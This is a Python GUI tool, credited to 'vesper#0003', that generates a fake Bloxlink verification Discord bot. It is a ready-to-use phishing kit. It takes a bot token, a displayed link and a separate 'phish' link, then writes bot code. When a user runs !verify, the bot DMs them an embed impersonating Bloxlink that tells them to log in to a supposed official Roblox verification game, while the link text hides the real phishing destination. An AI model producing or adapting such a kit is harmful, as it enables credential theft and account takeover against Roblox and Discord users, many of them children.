'''
By vesper#0003

Automatically Writes your Fake Bloxlink Verification Bot
The code can be used on replit or on desktop

! if you want to run the py file on your desktop, install these following modules !
- pip install pystyle
- pip install discord
'''
from tkinter import *;from tkinter import messagebox;import os;from pyperclip import copy
window = Tk()
window.title("Fake Bloxlink Verification Bot Builder || vesper#0003")
window.geometry("579x540")
window.maxsize(579, 540)
window.minsize(579, 540)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#D04848')
bg = PhotoImage(file='assets/background.png')
build = PhotoImage(file='assets/img0.png')
bloxlinkcode = r'''
import discord;from discord.ext import commands;import os;from pystyle import *
os.system('title Bloxlink Logs');os.system("mode con cols=80 lines=40")
blox = commands.Bot(command_prefix='!');blox.remove_command('help')
@blox.event
async def on_ready():
    print(f"""
{Col.white}[{Col.dark_red}+{Col.white}]{Col.dark_red} Connected To {Col.white}{blox.user.name}
{Col.white}[{Col.dark_red}+{Col.white}]{Col.dark_red} Below, you will see everyone that will try to verify
{Col.white}[{Col.dark_red}+{Col.white}]{Col.dark_red} Verification Command : {Col.white}!verify
    """)
@blox.command()
async def verify(ctx):
    print(f"{Col.white}[{Col.dark_red}+{Col.white}]{Col.dark_red} {Col.white}{ctx.author} {Col.dark_red}Is Verifying")
    # first embed
    emb = discord.Embed(title='Verification',description=f'I have sent you a link to verify in your direct messages {ctx.author.mention}',color=0xcf4948)
    await ctx.send(embed=emb)
    # second embed
    emb2 = discord.Embed(title='Please Complete Verification',description="To verify your account, please join BloxLink's Official Roblox Verification Game",color=0xcf4948)
    emb2.add_field(name='🔽 Please Login and join the game 🔽',value=f'[{link1}]({link2})')
    emb2.set_thumbnail(url='https://cdn.discordapp.com/attachments/972000889470582787/976642291248820324/bloxlink.png')
    await ctx.author.send(embed=emb2)
print(f"{Col.white}[{Col.dark_red}+{Col.white}]{Col.dark_red} Connecting To Your Bot..")
blox.run(tok)
'''
class Bloxlink:
    def build(self):
        q = messagebox.askquestion("Form","Click [YES] To copy the source code in your clipboard (replit) || Click [NO] To create python file.",icon='warning')
        if q == 'yes':
            code = f"link1='{self.visi.get()}';link2='{self.phish.get()}';tok='{self.token.get()}'"
            code += bloxlinkcode
            copy(code)
            messagebox.showinfo('Fake Bloxlink Verification Bot Builder || vesper#0003','Successfully Copied Your Code in Clipboard !');Bloxlink()
        elif q == 'no':
            code = f"link1='{self.visi.get()}';link2='{self.phish.get()}';tok='{self.token.get()}'"
            code += bloxlinkcode
            with open('YourBloxlink.py','w+',errors="ignore") as f:
                f.write(code)
            messagebox.showinfo('Fake Bloxlink Verification Bot Builder || vesper#0003','Successfully Created Python File !');Bloxlink()
    def verify(self):
        valid = False
        token = self.token.get()
        phish = self.phish.get()
        visi = self.visi.get()
        while True:
            if len(token) > 10:
                pass
            else:messagebox.showerror('Fake Bloxlink Verification Bot Builder || vesper#0003','Invalid Token');break
            if phish.startswith('https'):
                pass
            else:messagebox.showerror('Fake Bloxlink Verification Bot Builder || vesper#0003','Invalid Link');break
            if visi.startswith('https'):
                pass
            else:messagebox.showerror('Fake Bloxlink Verification Bot Builder || vesper#0003','Invalid Link');break
            valid = True;break
        if valid:
            self.build()
        else:Bloxlink()
    def __init__(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        self.token = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#D04848',width=46,borderwidth=0)
        self.token.place(x=189, y=238)
        self.phish = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#D04848',width=46,borderwidth=0)
        self.phish.place(x=189, y=295)
        self.visi = Entry(window,font=('SeoulHangang',10),bg='#D9D9D9', fg='#D04848',width=46,borderwidth=0)
        self.visi.place(x=189, y=352)
        buildbu = Button(window, image=build,bg='#D04848',borderwidth=0, activebackground="#D04848",command=self.verify)
        buildbu.place(x=218,y=410)
Bloxlink()
window.mainloop()